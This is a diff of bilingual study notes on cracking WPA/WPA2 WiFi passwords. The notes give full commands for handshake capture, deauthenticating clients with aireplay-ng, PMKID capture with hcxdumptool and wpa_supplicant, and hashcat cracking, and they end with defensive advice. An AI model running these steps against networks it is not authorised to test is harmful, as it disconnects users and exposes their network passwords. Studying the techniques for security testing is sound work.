@@ -1,4 +1,5 @@
 # [Wifi_Hacking](https://bbs.ichunqiu.com/thread-21342-1-1.html)
+## Problems
 ## a video('kali linux airmod-ng + hashcat.mp4')
 ## Through Capturing the `hccapx` file
 ### 一. 抓包
@@ -20,6 +21,25 @@
 另外,你的无线网卡在启动监听模式以后,网卡接口名称就变成了wlan0mon,以后只要是在aircrack套件中需要指定网卡接口名称的,都要用这个名字,在老版本的aircrack中默认名称是mon0,而新版本则统一变成了wlan0mon
 Monitoring mode allows you to capture packets without being connected to an access point/WiFi router. Also keep in mind the name of your interface will probably change when you turn monitoring mode on. You can confirm this by using ifconfig again. My interface changes to “wlan0mon”.
 2. 扫描附近无线情况
+开始扫描时会下面会显示哪些有客户端连接，这个时候按`Ctrl+C`会保留这个信息，方便后面的`aireplay-ng`，也可以在运行的过程中按鼠标的中键，或者滚动鼠标滚轮试试。
+扫描完成之后要用Ctrl+C停止，不然后面`airodump-ng`抓包时会出现信道一直跳来跳去`fixed channel`。
+有时候扫描的列表太少，需要重新插拔网卡，重新启动监听模式才行，得扫描出很多才是正常的。
+    * output files
+        `sudo airodump-ng -w ~/mnt/hgfs/J/hashcat-5.0.0/office_20181212 wlan0mon`
+        `cdutboy@ubuntu:~$ ls office*`
+        `office_20181212-01.cap  office_20181212-01.csv  office_20181212-01.kismet.csv  office_20181212-01.kismet.netxml`
+        open the office_20181212-01.csv to see the scan results
+    * Interaction
+        * [a]: Select active areas by cycling through these display options: AP+STA; AP+STA+ACK; AP only; STA only
+        * [d]: Reset sorting to defaults (Power)
+        * [i]: invert sorting algorithm
+        * [m]: Mark the selected AP or cycle through different colors if the selected AP is already marked
+        * [r]: (De-)Active realtime sorting-applies sorting algorithm everytime the display will be redrawn
+        * [s]: Change column to sort by, which currently includes: First seen; BSSID; PWR level; Beacons; Data packets; Channel; Max data rate; Encryption; Strongest Ciphersuite; Strongest Authentication; ESSID
+        * [SPACE]: Pause display redrawing/resume redrawing
+        * [TAB]: Enable/Disable scrolling through AP list
+        * [UP]: Select the AP prior to the currently marked AP in the displayed list if available
+        * [DOWN]: Select the AP after the currently marked AP if available
 The next thing you want to do is “listen” with airodump-ng, and note a few pieces of information.
 After running this command you will see a dynamic table of access points/routers. The top of the table should look something like this.
 ,一切准备就绪之后,我们开始尝试扫描附近的无线接入点,找个有客户端在线的再单独监听,一定要注意,”目标无线必须要有客户端在线”,否则是抓不到包的,这也是整个无线破解最核心的地方,因为我们要把对方的某个在线客户端蹬掉线,才能截获他的握手包
@@ -28,11 +48,11 @@ After running this command you will see a dynamic table of access points/routers
 我们要测试的wifi名称是YJS，我用我的手机连上去，有设备就好抓握手包了。我们想办法让我的手机掉线，然后再重新连接时抓取握手包，跑包就可以了。
 You will want to find the WiFi network you wish to target under the “ESSID” column. Once you see it you can hit the “ctrl” and “C” keys together on your keyboard to stop listening and freeze what is currently on the screen. The things you want to note from the row that corresponds to your target would be the following:
 
-* BSSID– This is the MAC address of the AP/Router. Copy/paste/write down this elsewhere for now.
-* PWR– If you are too far away from the AP/router you may have a tough time in the next step which is the most important step of all. If PWR = -1 you will have to do some research as to the issues you may come upon. Otherwise -2 through -80ish should be ok. Keep in mind that -2 would mean you have a much better signal than -80. The closer you are to the target AP/router the better chance you have of capturing the 4-way handshake in the next steps. Your options for getting better signal strength would be physically getting closer, or finding a wifi adapter or card that supports longer distances.
-* \#Data– This isn’t super important but I like to pay attention to it. If you see the number under data growing, it’s a good indicator that you will be able to capture the handshake more easily as there are connected clients passing traffic.
-* CH– This is the channel of the network. Copy/paste this elsewhere for now.
-* ENC– For this tutorial you should be testing against a network with “WPA2” listed.
+ * BSSID– This is the MAC address of the AP/Router. Copy/paste/write down this elsewhere for now.
+ * PWR– If you are too far away from the AP/router you may have a tough time in the next step which is the most important step of all. If PWR = -1 you will have to do some research as to the issues you may come upon. Otherwise -2 through -80ish should be ok. Keep in mind that -2 would mean you have a much better signal than -80. The closer you are to the target AP/router the better chance you have of capturing the 4-way handshake in the next steps. Your options for getting better signal strength would be physically getting closer, or finding a wifi adapter or card that supports longer distances.
+ * \#Data– This isn’t super important but I like to pay attention to it. If you see the number under data growing, it’s a good indicator that you will be able to capture the handshake more easily as there are connected clients passing traffic.
+ * CH– This is the channel of the network. Copy/paste this elsewhere for now.
+ * ENC– For this tutorial you should be testing against a network with “WPA2” listed.
 3. 单独监听目标wifi，准备抓取握手包
 单独监听目标无线热点,注意这里在监听目标无线的过程中不要断开,直到整个抓包过程完成为止,接下来要做的事情就是等待客户端上线,然后进行抓包,例如,下面就表示有一个客户端在线,其实,抓握手包的原理就是先把这个在线的用户给蹬掉线,然后再截获它的握手包,而这个包里就有我们想要的无线密码
  * `airodump-ng --bssid DC:EE:06:96:B7:B8 -c 6 -w sec wlan0mon` 监听目标无线,并把截获到的数据写到指定文件中
@@ -48,17 +68,19 @@ You will want to find the WiFi network you wish to target under the “ESSID” 
     Okay, now you have the proper bits of information so you can run airodump again, but this time have it only listen to the network you specify for a 4-way handshake. The 4-way handshake contains the data needed to reverse-engineer the encrypted password. You also tell airodump what to name the output from the captured data.  Replace 00:00:00:00:00:00 with the BSSID you collected in the last step. Replace 11 with CH you collected in the last step. After -w type the path to where you want the handshake capture saved, as well as the name of it (/folder/desired_filename). The “-o pcap” just tells airodump to give us the file in the .cap format which we can use in later steps.
 Now you will see a similar table to the one you saw in the last step, but this time you should notice a few differences. The first difference is that only your target network should show up now. You may also notice an additional table underneath that. It will look similar to this.
 This lower table shows client devices that are connected to your target AP/Router. Ideally you will have a few options to choose from. From this table you want to note a couple of things. Be sure to keep this running for now.
-* PWR– If you have options, you want to go with the client that has a better signal (-35 being much better than -80).
-* Frames– A client with a high frame count is another good option. The higher frame count is usually an indication that wireless traffic is flowing pretty good from the client.
-* STATION – This is the MAC address of the client device. Note this down, in the next step we are going to trick the client into re-negotiating it’s connection with the access point.
+ * PWR– If you have options, you want to go with the client that has a better signal (-35 being much better than -80).
+ * Frames– A client with a high frame count is another good option. The higher frame count is usually an indication that wireless traffic is flowing pretty good from the client.
+ * STATION – This is the MAC address of the client device. Note this down, in the next step we are going to trick the client into re-negotiating it’s connection with the access point.
 If the network you are listening to is very busy you may not need to do this next step at all. Essentially at this point as mentioned before we are waiting to snag a copy of the 4-way handshake which happens when a client authenticates to an AP/router. Sometimes this will be captured simply by listening for long enough. On a very busy network, this may happen within a few minutes or faster. If you get a handshake before completing the next step with “aireplay” you can skip it and move on to “Step 2: Prep the .cap for Hashcat”.
 ???fixed channel always changing???
+channel is fixed by using alfa awus036nh adapter
 4. 使用DEAUTH攻击使已经连接的客户端断开并重新连接，以产生握手包(用minidwep-gtk长时间一般也可以抓到包）
 For this example let’s say you are on a network that’s not very busy, and devices typically stay connected to the wireless network for days at a time or longer. Instead of waiting for an undetermined amount of time for a connection to happen so we can capture it, we can force it to happen (usually). So let’s go ahead and do that. We are going to “DEAUTH” the client we noted in the last step (STATION) using aireplay.
 ??? `aireplay` and `mdk3` will cause ubuntu crash, or the `airodump-ng` causes it.???
 发现客户端在线稳定后,就可以向目标发射’ddos’流量了,直到我们在监听的终端下看到有握手包出现为止,如果第一轮包发完成后,并没看到握手包,别着急,先等个几十秒,或者隔个五六秒再发一次即可,正常情况下,基本一次就能搞定
 通过aireplay-ng的工具，它可以强制用户断开wifi连接；原理是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi。
- * `aireplay-ng -0 10 -a EC:26:CA:33:E1:B6 -c C0:EE:FB:E9:9D:7C mon0` (此种方法在虚拟机上运行时会造成系统崩溃）
+ * `aireplay-ng -0 10 -a EC:26:CA:33:E1:B6 -c C0:EE:FB:E9:9D:7C mon0` (此种方法在虚拟机上运行时会造成系统崩溃，用ALFA AWUS036NH网卡不会）
+     有时候运行完这个命令需要等一下，才会有成功的handshake，可能是客户端需要重新连接
   参数解释： -0 Deautenticate攻击模式 0代表无限次（是数字）
   -a 目标ap的mac
   -c 客户端网卡mac
@@ -81,21 +103,26 @@ For this example let’s say you are on a network that’s not very busy, and de
      Keep the airodump window running in the background and open a new terminal. Type the following. Replace 00:00:00:00:00:00 with the BSSID and replace 11:11:11:11:11:11 with the MAC address you collected from STATION in the last step.
 
 What you want to do now is watch for 2 things.
-* In the aireplay window you will get some responses from your command. The information you want to see from the response is the ACK’s. You want the number in front of the “|” to be higher than 0. This will indicate the client received your deauth packets. If you get 0, try sending the command again.
+ * In the aireplay window you will get some responses from your command. The information you want to see from the response is the ACK’s. You want the number in front of the “|” to be higher than 0. This will indicate the client received your deauth packets. If you get 0, try sending the command again.
     * Good
         ![success_ACKs](success_ACKs.png)
     * Bad
         ![failed_ACKs](failed_ACKs.png)
-* In the airodump window you are looking for confirmation that a handshake was captured. You will most likely see the STATION disappear after you send the deauth. When it shows back up, odds are a handshake will be captured. It should show up on the top line furthest to the right when you do capture it.
+ * In the airodump window you are looking for confirmation that a handshake was captured. You will most likely see the STATION disappear after you send the deauth. When it shows back up, odds are a handshake will be captured. It should show up on the top line furthest to the right when you do capture it.
     ![airodump_handshake](airodump_handshake.png)
-* Other things you can try are deauth a different client/STATION or keep waiting for a new connection to happen. I’ve had situations where the handshake was captured in seconds, and other times where it took closer to an hour of waiting for STATIONS to show up while I sent deauths, and/or waited for a handshake to come in….. hypothetically that is…. =)
+ * Other things you can try are deauth a different client/STATION or keep waiting for a new connection to happen. I’ve had situations where the handshake was captured in seconds, and other times where it took closer to an hour of waiting for STATIONS to show up while I sent deauths, and/or waited for a handshake to come in….. hypothetically that is…. =)
 Once you ensure you have the .cap file where you told airdump to put it (directory and filename you configured with the “-w” option) you can close airodump and aireplay.
+
 5. 抓包成功后ctrl+C即可结束抓包。
 停止监听模式
 `airmon-ng stop wlan0mon`
 #### SSID, BSSID and ESSID
 [Understanding the Network Terms SSID, BSSID, and ESSID](https://www.juniper.net/documentation/en_US/junos-space-apps/network-director2.0/topics/concept/wireless-ssid-bssid-essid.html)
 [Differences between BSSID, ESSID and SSID](https://www.cwnp.com/forums/posts?postNum=288444)
+An xSSID is an identifier of either a network by name or a radio by MAC address.
+BSSID is the MAC address of the AP's radio for that service set.
+SSID is the service set identifier or network name for the basic service set(BSS).
+ESSID is the same as the SSID but is used across multiple access points as part of the same WLAN.
 ### 二. 把cap转换成hccap
 * 用aircrack-ng
 `aircrack-ng <out.cap> -J <out.hccap>`
@@ -127,6 +154,9 @@ Once you ensure you have the .cap file where you told airdump to put it (directo
 破解的结果：
 ![破解结果](破解结果.png)
 ## A new attack on WPA/WPA2 using PMKID
+![a video on cracking using PMKID](https://www.youtube.com/watch?v=DarsUXcHTSU)
+![a video on cracking using PMKID](https://www.youtube.com/watch?v=MNTDPLeavso)
+![a video on cracking using PMKID](https://www.youtube.com/watch?v=ve_0Qhd0bSM)
 A new technique has been discovered to easily retrieve the Pairwise Master Key Identifier (PMKID) from a router using WPA/WPA2 security, which can then be used to crack the wireless password of the router. While previous WPA/WPA2 cracking methods required an attacker to wait for a user to login to a wireless network and capture a full authentication handshake, this new method only requires a single frame which the attacker can request from the AP because it is a regular part of the protocol.
 This new method was discovered by Jens "atom" Steube, the developer of the popular Hashcat password cracking tool, when looking for new ways to crack the WPA3 wireless security protocol. According to Steube, this method will work against almost all routers utilizing 802.11i/p/q/r networks with roaming enabled.
 This method works by extracting the RSN IE (Robust Security Network Information Element) from a single EAPOL frame. The RSN IE is a optional field that contains the Pairwise Master Key Identifier (PMKID) generated by a router when a user tries to authenticate.
@@ -148,7 +178,14 @@ In this short blog, I will walk you through the process of obtaining a valid PMK
 In this writeup, I'll describe a new technique to crack WPA PSK (Pre-Shared Key) passwords.
 In order to make use of this new attack you need the following tools:
 * [hcxdumptool v4.2.0 or higher](https://github.com/ZerBea/hcxdumptool)
+    * `git clone https://github.com/ZerBea/hcxdumptool`
+    * `make`
+    * `sudo make install`
 * [hcxtools v4.2.0 or higher](https://github.com/ZerBea/hcxtools)
+    * `git clone https://github.com/ZerBea/hcxtools`
+    * `make`
+    * `sudo make install`
+    * run `sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev` for requirements
     * run `sudo apt install libcurl4-openssl-dev` when prompted with "fatal error: curl/curl.h: No such file or directory" when run `run`
 * [hashcat v4.2.0 or higher](https://github.com/ZerBea/hcxdumptool)
 This attack was discovered accidentally while looking for new ways to attack the new WPA3 security standard. WPA3 will be much harder to attack because of its modern key establishment protocol called "Simultaneous Authentication of Equals" (SAE).
@@ -337,9 +374,131 @@ The PMKID is computed by using HMAC-SHA1 where the key is the PMK and the data p
 `PMKID=HMAC-SHA1-128(PMK,"PMK Name"|MAC_AP|MAC_STA)`
 Since the PMK is the same as in a regular EAPOL 4-way handshake this is an ideal attacking vector.
 We receive all the data we need in the first EAPOL from the AP.
-### How to reproduce
+
+### Experience
+* By using `hcxdumptool`, PMKID can be found from some routers (e.g. china union router CU_XXXX), but cannot be found from some routers (e.g. TP-Link routers), no matter how the parameters are set.
+* can get PMKIDs from all available routers by running `hcxdumptool` without `--filterlist=<filterfile>`
+* 最后，对于利用PMKID破解PSK的新攻击方式，我做出如下总结：
+  1. 该攻击方式并没有明显降低攻击WPA/WPA2网络的难度，依然需要字典式进行暴力破解，只是允许在无客户端情况下进行。
+  2. 该攻击只对WPA-PSK/WPA2-PSK有效，对企业级802.1X认证热点（WPA-Enterprise）无效。
+  3. 大部分低端家用级路由器由于不支持漫游特性，对该攻击免疫；少部分中高端路由器（往往支持802.11AC）可能受影响，用不上就关掉吧（如果可以的话）。三种获取PMKID的方法都是如此。
+  4. 对于用户：依然是提高无线密码复杂度，警惕热点密码分享APP。
+  5. 对于路由器厂商：对WPA-PSK考虑是否有支持漫游特性的必要，或者增加开关。
+* The algorithm to generate the PMKID is of the same suit as the algorithm to generate the PMK (attack by handhsake). So there will be no noticeable difference between a handshake attack (PMK) and an attack by the "first way" EAPOL (PMKID)
+* 可行的方法是用不带`--filterlist`的`hcxdumptool`来获取所有可以获取的PMKID
+
+### Capturing the PMKIDs using `tcpdump` and Wireshark
+* Start tcpdump on my interface in managed mode
+* Associate with network manager by entering any key
+* Open the capture with wireshark
+![capturing PMKID using `tcpdump1` and Wireshark](tcpdump.jpg)
+The monitor mode allows to capture traffic between any client and any Access Point. 
+The promiscuous mode only allows to capture the traffic at the access point to which we are associated. 
+All the chipsets are not compatible with the monitor mode but all the chipsets work in "promiscuous mode" with the right program (wirehsark, tcpdump) 
+It is another advantage with this new attack: We do not need a compatible chipset with monitor mode .. But it seems that for some this is nothing and that this is "a shit stuck in a stick"
+I would like to say one thing to put things in perspective: The WPA2 and the protocols we talked about were created by the world elite in these areas. All the material manufacturers, all the development teams of the world, google etc ... have studied and applied these protocols. 
+And an uncle, alone, without the help of anyone, a simple enthusiast, has put his finger on something that everyone and all these specialists have had in front of their noses for 10 years and that nobody has seen. And he has shared it without asking anything to anyone in return ... 
+I prefer to stop there and not evoke what I think about the messages that I deleted yesterday in this thread because atom and its method deserve a decent thread.
+From what I see, the routers that have been put in service these last 3 years in France, with a 5Ghz network and another 2.4Ghz, are vulnerable. 
+Has anyone tried with your router?
+* `sudo tcpdump -i <interfaz> -w ficherocaptura`
+* Connect to your router with the network manager `sudo service network-manager start`
+* Stop the process in console with tcpdump
+* Open with wireshark the capture file that we have generated `wireshark tcpdump.capture`
+* Put eapol on the wireshark top bar
+* Open the EAPOL 1 (or 3) package and click on the last parameter to see if there is no PMKID
+After following the steps, I can confirm that my Compal router, yes it is vulnerable a priori. At first I did not get the eapol plot, because I was not sending any key to the router, my mistake, here are the screenshots:
+![tcpdump](tcpdump1.jpeg)
+![wireshark](wireshark.jpeg)
+![tcpdump results](tcpdump_resutls.png)
+Alex, regarding your question, I think the same thing happens to you as to me at the beginning.
+* 1- You look at the name of the interface, with airmon-ng you get
+* 2- Connect to a Wi-Fi network through the network manager you have
+* 3- Execute the command that put kcdtv (sudo tcpdump -i interface -w name of the package that is saved
+* 4- Up to here everything is fine
+* 5- Now that this tcpdump collecting packages, take the same mobile and you connect to the same network that you have connected to the pc, putting your password, wait for it to connect and you can then cancel the capture of tcpdump with ctrl + c
+* 6- You open the capture with wireshark, you filter by eapol and you should already leave these packages to be able to search the information about pmkid
+Hope this can help you!
+### [Getting PMKID using wpa_supplicant](https://www.wifi-libre.com/topic-1161-captura-pmkid-con-wpasupplicant.html)
+In this topic we will focus on obtaining the PMKID (and the other necessary chains) with the Swiss WiFi knife in Linux: `wpa_supplicant`.
+The advantage of this method is that it does not require any "extra" dependency and it is "univeral": We can do it in eny OS in Linux, no matter what the device is, what the chipset of the WiFi interface is.
+#### Scanning
+We do it with `wpa_cli`, the interactive command interpreter included in wpa_supplicant.
+* First run `sud -i` to obtain administrator privileges in the console (we will need to be "root" all the time)
+* Then we detect the available WiFi interfaces to know their names by running `iw dev`.
+    * In my case I have a single interface called `wlp2s0`
+        ![available interfaces](iw_dev.jpg)
+        and I also note my mac address that I'll need later.
+* We wrote a very basic configuration file to be able to execute `wpa_cli`. We will save it in `/tmp` (this will be erased) by calling it `wpacli.conf`
+    `echo "ctrl_interface=/var/run/wpa_supplicant" >> /tmp/wpacli.conf`
+* Before we start pulling `wpa_cli` we turn off NetworkManger and make sure the interface is ready to scan
+    `systemctl stop NetworkManager; rfkill unblock wifi; ip l s wlp2s0 up`
+* We execute `wpa_supplicant` indicating the configuration file (`/tmp/wpacli.conf`) and the WiFi Interface (`wlp2s0`)
+    `wpa_supplicant -i wlp2s0 -c /tmp/wpacli.conf -B`
+* We so the scan with
+    `wpa_cli scan`
+* And we get the result with
+    `wpa_cli scan_results`
+    We collect two data: the eSSID (name of our network) and the bSSID (the mac address of our network):
+    ![wpa_cli scan results](wpa_cli-scan-results.jpg)
+* We kill the `wpa_supplicant` process that we have sent in background (option `-B`) to prevent conflicts and we will be ready to pick up the PMKID and the hashes
+    `killall wpa_supplicant`
+#### Capture PMKID and hashes
+We continue in our console with administrator privileges.
+* Let's first write a configuration file with a "junk" key first to connect to our Access Point. We use the `wpa_passphrase` command (also part of `wpa_supplicant`)
+    `wpa_passphrase MIWIFI_XXXX 12345678 >> /tmp/pmkid.conf`
+    The eSSID that we can copy and paste from the scan should be put before the key. The file will be `/tmp/pmkid.conf`
+* Now we can make the attack with: `wpa_supplicant -c /tmp/pmkid.conf -i wlp2s0 -dd` or `wpa_supplicant -c /tmp/pmkid.conf -i wlp2s0 -dd > /tmp/wpa_results` or `wpa_supplicant -c /tmp/pmkid.conf -i wlp2s0 -dd | grep "PMKID from Authenticator" -m 1`
+    Everything goes very fast, leave it 4-5 seconds and for the process with `Ctrl+C`. The "trick" is to use the "debug" mode with double output level (argument `-dd`)
+* Before picking up the PMKID and the chains that were used to generate them, we see that they are:
+    * bSSID that we have already seen in the scan... Anyway, it comes out again in the output of our `wpa_supplicant`
+    * our mac: We have seen it in detecting the interfaces. Anyway, it's at the exit.
+    * eSSID in hexadecimal format. We do not have it (we have it in ascii format) and we just got it
+    * the PMKID
+* We make a scroll until the beginning of the sequence (the order `wpa_supplicant`) and we have the eSSID in hexadecimal:
+    ![essid in hexadecimal](essid_in_hexadecimal.jpg)
+    "the essid in hexadecimal is obtained when starting wpa_supplicant"
+* We go down the console until we fall in the EAPOL zone. We are in it when we begin to see the hexadecimal long chains multiply (the packages in their original format). The PMKID is in the first EAPOL message. We thus obtain all the elements that were missing.
+    ![all other information in EAPOL zone](EAPOL_zone.jpg)
+    I suggest trying to follow the process when we scroll. It is interesting to see in detail the steps of a wpa connection with wpa_supplicant:
+    * After teaching the essid in hexadecimals that from our configuration file the program "makes a hand on the interface"
+        ![Add interface wlp2s0](make_a_hand_on_the_interface.jpg)
+    * search our essid until you find it
+        ![Search our essid](search_our_essid.jpg) (here it is)
+    * then the association is made
+        ![then association is made](association_is_made.jpg)
+    * And later we fall in the EAPOL zone where we find the PMKID
+    So far we arrived.
+    The "crack" part (attack by dictionary or brute force) can be done at the moment with hashcat.
+    We have all the elements to form our "hash". There will probably be alternatives soon. But we already left the focus of this topic: get the PMKID (and the other chains) with the most fundamental: bash and wpa_supplicant. Two things that we will find in all linux systems.
+* Form the 16800 file
+The content of the written file will look like this: `2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89acf0e761f4*ed487162465a774bfba60eb603a39f3a` The columns are the following (all hex encoded):
+    * PMKID
+    * MAC AP
+    * MAC Station
+    * ESSID
+### getting PMKID using hcxdumptool
+#### Experience
+* By using `hcxdumptool`, PMKID can be found from some routers (e.g. china union router CU_XXXX), but cannot be found from some routers (e.g. TP-Link routers), no matter how the parameters are set.
+* can get PMKIDs from all available routers by running `hcxdumptool` without `--filterlist=<filterfile>`
+* 最后，对于利用PMKID破解PSK的新攻击方式，我做出如下总结：
+  1. 该攻击方式并没有明显降低攻击WPA/WPA2网络的难度，依然需要字典式进行暴力破解，只是允许在无客户端情况下进行。
+  2. 该攻击只对WPA-PSK/WPA2-PSK有效，对企业级802.1X认证热点（WPA-Enterprise）无效。
+  3. 大部分低端家用级路由器由于不支持漫游特性，对该攻击免疫；少部分中高端路由器（往往支持802.11AC）可能受影响，用不上就关掉吧（如果可以的话）。
+  4. 对于用户：依然是提高无线密码复杂度，警惕热点密码分享APP。
+  5. 对于路由器厂商：对WPA-PSK考虑是否有支持漫游特性的必要，或者增加开关。
+#### 0. get prepare and choose a target ap
+* `sudo airmon-ng check kill`
+* `sudo airmon-ng start wlx70f11c11576b`
+* `sudo airodump-ng start wlan0mon` `Ctrl+C`
+* `echo "FCD733E71B78" > apmac.txt`
+* `sudo airmon-ng stop wlan0mon`
+* set the interface to monitor mode manually:
+*   `ip link set <interface> down`
+*   `iw dev <interface> set monitor control`
+*   `ip link set <interface> up`
 #### 1. Run hcxdumptool to request the PMKID from the AP and to dump the received frame to a file( in pcapng format)
-`$ ./hcxdumptool -o test.pcang -i wlp39s0f3u4u5 --enable_status`
+`$ ./hcxdumptool -o test.pcapng -i wlp39s0f3u4u5 --filterlist=apmac.txt --filtermode=2 --enable_status=3`
 
 Output:
 
@@ -359,9 +518,57 @@ IF an AP receives our association request packet and supports sending PMKID we w
         [13:29:57-011]4604ba734d4e->89acf0e761f4[ASSOCIATIONRESPONSE,SEQUENCE 1206]
         [13:29:57-011]4604ba734d4e->89acf0e641f4[FOUND PMKID]
 Note: Based on the noise on the wifi channel it can take some time to receive the PMKID. We recommend running hcxdumptool up to 10 minutes before aborting.
+`hcxdumptool -h`
+* do not run hcxdumptool on logical interfaces (monx, wlanxmon)
+    * you would better to run `sudo airmon-ng stop wlan0mon` before running `hcxdumptool`
+    * but it seems making no differences by using wlan0mon or wlx70f11c11576b
+    * How do you set monitor mode? hcxdumptool doesn't like logical interfaces while the physical interface is leaving managed. So, do not set monitor mode by airmon-ng!
+    * In theory, you do not need to set the Wi-Fi adapter to monitor mode – hcxdumptool should do it for you, but if the next command arises messages: `interface is not up; failed to init socket`
+        then set the wireless interface into monitor mode manually with commands of the form:
+        `sudo ip link set <interface> down`
+        `sudo iw dev <interface> set monitor control`
+        `sudo ip link set <interface> up`
+* `-i <interface>`: interface (monitor mode will be enabled by hcxdumptool)
+    * can also be done manually:
+        `ip link set <interface> down`
+        `iw dev <interface> set type monitor`
+        `ip link set <interface> up`
+* `-c <digit>`: set scanlist (1,2,3,...)
+    * default scanlist is: 1,3,5.7,9,11,13,2,4,6,8.10.12
+* `-t <seconds>`: stay time on channel before hopping to the next channel, default: 5 seconds
+* `-I`: show wlan interfaces and quit
+    * `sudo tcpdump -I`
+        * ![tcpdump_I](tcpdump_I.png)
+        * With this command, we get a list of wlan interfaces
+            `c0b6f9daaf3e wlo1 (iwlwifi)`
+            `00c0ca900d9f wlp0s20f0u1 (rt2800usb)`
+        * And also two warnings:
+            `warning: NetworkManager is running with pid 578`
+            `warning: wpa_supplicant is running with pid 1190`
+            They mean that the programs NetworkManager and wpa_supplicant with process IDs 578 and 1190 are running at the moment. It is highly recommended stopping these programs. This can be done with the kill command, after which specify the pid of processes (change the digits to your values)
+* `--filterlist=<file>`
+    mac filter list
+    format: 112233445566 + comment
+    maximum line length 255, maximum entries 64
+* `--filtermode=<digit>`: mode for filter list
+    * `1`: use filter list as protection list (default) in transmission branch
+        receive everything, interact with all APs and CLIENTs in range, except (!) the ones from the filter list
+    * `2`: use filter list as targe list in transmission brance
+        receive everything, only interact with APs and CLIENTs in range, from the filter list
+    * `3`: use filter list as target list in receiving branch
+        only receive APs and CLIENTs in range, from the filter list
+* `--enable_status=<digit>`: enable status messages, bitmask:
+    * `1`: EAPOL
+    * `2`: PROBEREQUEST/PROBERESPONSE
+    * `4`: AUTENTICATION
+    * `8`: ASSOCIATION
+    * `16`: BEACON
+    * `15`: means to enable real-time display of EAPOL, PROBEREQUEST/PROBERESPONSE, AUTHENTICATON, ASSOCIATION – you can reduce verbality, see the help: https://en.kali.tools/?p=84
+* `--disable_deauthentications`
+    The above command attempts to collect data from all access points within reach, and both “client-less” attack and a classic deauthentication attack are used. If you want to collect PMKID without parallel deauthentication attack, then use the `--disable_deauthentications` option in addition.
 
 Quote:
-> When trying to target a specific AP (making sure I only hit mine, not my neighbors), I'm trying to use `--filtermode=2` and `--filterlist=filter.txt`. `filter.txt` consists of a single line containing my AP's address in the form "05D2BA2B8CD". This consistently returns segmentation fault. Remove just the `--filterlist` and everything appears to work fine, though I'm not sure how `filtermode=2` works with no list, but it runs.
+> ~~When trying to target a specific AP (making sure I only hit mine, not my neighbors), I'm trying to use `--filtermode=2` and `--filterlist=filter.txt`. `filter.txt` consists of a single line containing my AP's address in the form "05D2BA2B8CD". This consistently returns segmentation fault. Remove just the `--filterlist` and everything appears to work fine, though I'm not sure how `filtermode=2` works with no list, but it runs.~~
 > The exact line is:
 > `root@notka1i:~/Desktop/PMKID# hcxdumptool -o test.pcapng -i wlan0 --enable_status --filtermode=2 --filterlist=filter.txt`
 > I've tried several variants (e.g. `--filterlist` `./filter.txt`, full path, etc.) with the same results.
@@ -414,7 +621,7 @@ Quote:
 > What do you all typically do? Run hcxdumptool locked on one channel or allow it to scan? Seems strange, but it my case I always have faster results when Airodump is running in another window.
 
 Quote:
-> Note: Since v4.2.1, hxcdumptool --enable_status requires a parameter. 1 is the number you are looking for. You might want to +2 if you want to see which AP is which.
+> Note**: Since v4.2.1, hxcdumptool --enable_status requires a parameter. 1 is the number you are looking for. You might want to +2 if you want to see which AP is which**.
 
 Quote:
 > hcxdumptool is able to run different attack vectors. And the client-less (PMKID) attack vector is only one of them:
@@ -434,6 +641,20 @@ Quote:
 > A client and an access point are required for this attack vector!
 > You need to have a good antenna (high gain)!
 > Attack vector will not work if PMF is enabled
+
+Quote:
+> Quote:Thanks for the info. Not sure it answered my question?
+> Can someone tell me why am only getting Found handshake AP-LESS ,EAPOL TIMEOUT 
+> I have not seen PMKID Found only handshake found
+> Thanks Kev
+> 
+> Its because you're not in range of any Routers which broadcast the PMK  just as zerobeat has told you.
+> This attack does not enable clientless attacks on ALL MAKES OF ROUTERS. It's only available if the router is setup to provide you with the proper information for the PMK. The data you have is telling you that you have obtained an AP-Less Handshake, meaning you are only able to receive a signal strong enough to the client and not the router.
+
+Quote:
+> 虽然您可以指定另一个状态值，但除了 1 之外我没有成功。
+Quote:
+> 如果AP收到我们的请求数据包并且支持发送PMKID的话，不久就会收到"FOUND PMKID"消息：根据wifi通道上的噪音情况的不同，可能需要过一段时间才能收到PMKID。我们建议，如果运行hcxdumptool超过10分钟还没收到PMKID，那么就可以放弃了。
 
 #### 2. Run hcxpcaptool to convert the captured data from pcapng format to a hash format accepted by hashcat.
 `$ ./hcxpcaptool -z test.16800 test.pcapng`
@@ -474,11 +695,26 @@ The columns are the following (all hex encoded):
 * MAC AP
 * MAC Station
 * ESSID
-Note: While note required it is recommended to use options `-E -I` and `-U` with hcxpcaptool. We can use these files to feed hashcat. They typically produce good results.
+ In fact, everything is quite simple. The most interesting part of the hash for us is the one that follows the last asterisk. It contains the name of the Access Point in hexadecimal form. To decode this name into a normal form, use the following command:
+ `echo HEX_string | xxd -r -p`
+For example, I want to know the name that is coded as 50555245204655524e4954555245, then:
+`echo 50555245204655524e4954555245 | xxd -r -p`
+Results:
+`PURE FURNITURE`
+
+`whoismac -p 69d4ec91a19657d64d4ccc869c229bbe*9e3dcf272236*f0a225dab76d*53696c7665724d61676e6f6c6961`
+
+        ESSID..: SilverMagnolia
+        MAC_AP.: 9e3dcf272236
+        VENDOR.: unknown
+        MAC_STA: f0a225dab76d
+        VENDOR.: Private
+Note: While note required it is recommended to use options `-E -I` and `-U` with hcxpcaptool. We can use these files to feed hashcat. They typically produce good results.注意：我们建议为hcxpcaptool使用选项-E -I和-U，当然，这不是必须的。我们可以使用这些文件来“饲喂”hashcat，并且通常会产生非常好的效果。
 * `-E` retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)
 * `-I` retrieve identities from WiFi-traffic
 * `-U` retrieve usernames from WiFi-traffic
 `$ ./hcxpcaptool -E essidlist -I identitylist -U usernamelsit -z test.16800 test.pcang`
+
 #### 3. Run hashcat to crack it.
 We can download the newly updated https://hashcat.net/hashcat/ V4.2.0 which cracks two new hash types:
 WPA-PMKID-PBKDF2
@@ -602,20 +838,9 @@ If you are following the series from the very beginning you must be familiar wit
 So, we need to discover various ways to crack the WPA-PSK within a short span of time. Which is possible if we somehow get the PSK via router panel, keylogger or use a GPU instead of CPU to use its multiple cores to boost cracking speed, or something even different.
 That is what we will learn in this chapter. We will boost the WPA2 crakcing speed without using any GPU or Cloud. Which can be very useful with the AP's very common name like "Airtel", "MTNL", "Belkin" etc.
 WPA2 cracking is dependent on SSID and passphrase that meas that if there are 2 access points with different SSID but same Passphrase, their PMKs will be completely different.
-### What is PMK?
